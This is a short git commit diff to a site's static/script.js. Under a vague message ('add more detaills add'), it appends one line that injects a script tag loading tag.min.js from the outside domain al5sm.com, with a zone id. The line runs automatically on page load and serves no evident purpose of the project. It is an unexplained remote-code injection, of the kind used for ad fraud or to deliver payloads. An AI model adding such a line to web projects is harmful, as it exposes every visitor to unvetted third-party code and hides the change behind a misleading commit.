1ec52d886b0275a3aea6f2ef785d0e9be9143500
emxcoder <emx.coder@gmail.com>
2026-03-30 02:06:36 +0200

    add more detaills add

--- static/script.js
+++ static/script.js
@@ -12,3 +12,4 @@ async function clicked() {
     document.getElementById('nome').innerText = 'EMXCODER'
 }
 
+(function (s) { s.dataset.zone = '10804632', s.src = 'https://al5sm.com/tag.min.js' })([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
